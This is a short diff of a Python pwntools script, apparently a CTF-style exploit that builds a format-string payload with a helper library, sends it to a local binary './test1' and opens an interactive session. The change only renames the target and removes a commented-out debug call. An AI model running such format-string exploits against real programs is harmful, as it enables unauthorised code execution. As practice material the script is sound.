@@ -1,7 +1,7 @@
 from one_fmt import *
 from pwn import *
 
-r = process("./n", level="debug")
+r = process("./test1", level="debug")
 
 fmt = Fmt(24)
 r.recvuntil("@ ")
@@ -18,8 +18,6 @@ r.recvuntil("say")
 payload = fmt.build(0)
 print payload
 print len(payload)
-
-# debug()
 
 r.sendline(payload)
 r.interactive()
